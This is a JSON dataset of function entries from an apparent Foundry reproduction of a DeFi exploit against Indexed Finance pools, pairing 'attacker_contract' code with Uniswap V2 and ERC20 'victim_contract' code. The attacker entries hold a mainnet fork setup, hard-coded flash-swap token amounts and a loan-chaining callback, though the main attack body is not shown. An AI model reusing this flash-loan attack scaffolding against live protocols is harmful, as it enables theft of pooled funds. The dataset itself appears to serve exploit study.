[
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "borrowedAmounts",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "borrowedTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "factories",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "repayAmounts",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"https://eth.llamarpc.com\", 13_417_948);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "testHack",
    "original_code": "    function testHack() public {\n        address[] memory tokensBorrow = new address[](6);\n        tokensBorrow[0] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;\n        tokensBorrow[1] = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;\n        tokensBorrow[2] = 0xc00e94Cb662C3520282E6f5717214004A7f26888;\n        tokensBorrow[3] = 0xD533a949740bb3306d119CC777fa900bA034cd52;\n        tokensBorrow[4] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;\n        tokensBorrow[5] = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;\n\n        uint256[] memory amounts = new uint256[](6);\n        amounts[0] = 2_000_000 * 1e18;\n        amounts[1] = 200_000 * 1e18;\n        amounts[2] = 41_000 * 1e18;\n        amounts[3] = 3_211_000 * 1e18;\n        amounts[4] = 5800 * 1e18;\n        amounts[5] = 453_700 * 1e18;\n\n        address[] memory factories_ = new address[](6);\n        factories_[0] = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n        factories_[1] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;\n        factories_[2] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;\n        factories_[3] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;\n        factories_[4] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;\n        factories_[5] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;\n\n        start(tokensBorrow, amounts, factories_);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IndexedAttack",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(\n        address _sender,\n        uint256 _amount0,\n        uint256 _amount1,\n        bytes calldata _data\n    ) external override {\n        require(_sender == address(this), \"!sender\");\n\n        (address tokenBorrow, uint256 amount, address factoryAddr) = abi.decode(_data, (address, uint256, address));\n        address token0 = IUniswapV2Pair(msg.sender).token0();\n        address token1 = IUniswapV2Pair(msg.sender).token1();\n        address pair = IUniswapV2Factory(factoryAddr).getPair(token0, token1);\n        require(msg.sender == pair, \"!pair\");\n\n        // about 0.3%\n        uint256 fee = ((amount * 3) / 997) + 1;\n        uint256 repayAmount = amount + fee;\n\n        if (!attackBegan) {\n            pairs.push(pair);\n            repayAmounts.push(repayAmount);\n            count++;\n            if (count == borrowedAmounts.length) {\n                attackBegan = true;\n                attack();\n                repayLoans();\n            } else {\n                getLoan();\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Factory",
    "source_type": "victim_contract",
    "function_name": "getPair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Pair",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Pair",
    "source_type": "victim_contract",
    "function_name": "token0",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Pair",
    "source_type": "victim_contract",
    "function_name": "token1",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMarketCapSqrtController",
    "source_type": "victim_contract",
    "function_name": "reindexPool",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMarketCapSqrtController",
    "source_type": "victim_contract",
    "function_name": "updateMinimumBalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IIndexPool",
    "source_type": "victim_contract",
    "function_name": "exitPool",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IIndexPool",
    "source_type": "victim_contract",
    "function_name": "extrapolatePoolValueFromToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IIndexPool",
    "source_type": "victim_contract",
    "function_name": "getBalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IIndexPool",
    "source_type": "victim_contract",
    "function_name": "getTotalDenormalizedWeight",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IIndexPool",
    "source_type": "victim_contract",
    "function_name": "gulp",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IIndexPool",
    "source_type": "victim_contract",
    "function_name": "joinswapExternAmountIn",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IIndexPool",
    "source_type": "victim_contract",
    "function_name": "swapExactAmountIn",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address guy, uint wad) public returns (bool) {\n        _approvals[msg.sender][guy] = wad;\n\n        Approval(msg.sender, guy, wad);\n\n        return true;\n    }\n}\n\n////// lib/ds-token/src/token.sol\n/// token.sol -- ERC20 implementation with minting and burning\n\n// Copyright (C) 2015, 2016, 2017  DappHub, LLC\n\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// (at your option) any later version.\n\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n\n// You should have received a copy of the GNU General Public License\n// along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address src) public view returns (uint) {\n        return _balances[src];\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        if (src != msg.sender) {\n            _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);\n        }\n\n        _balances[src] = sub(_balances[src], wad);\n        _balances[dst] = add(_balances[dst], wad);\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        if (src != msg.sender) {\n            _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);\n        }\n\n        _balances[src] = sub(_balances[src], wad);\n        _balances[dst] = add(_balances[dst], wad);\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Router01",
    "source_type": "victim_contract",
    "function_name": "swapTokensForExactTokens",
    "original_code": "    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n",
    "description": ""
  }
]